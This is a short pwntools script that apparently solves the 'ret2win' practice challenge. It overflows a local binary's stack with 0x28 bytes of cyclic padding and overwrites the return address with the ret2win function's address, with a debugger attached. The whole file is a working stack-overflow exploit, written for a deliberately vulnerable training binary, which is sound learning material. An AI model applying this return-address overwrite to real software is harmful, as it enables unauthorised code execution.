from pwn import*
context.log_level       = "DEBUG"
context.arch            = "amd64"

elf = context.binary = ELF('./ret2win', checksec=False)

p = process("./ret2win")

gdb.attach(p, gdbscript='''''')

payload = flat(
    cyclic(0x28),
    elf.sym['ret2win']+14
    )
p.sendlineafter(b">",payload)
p.interactive()
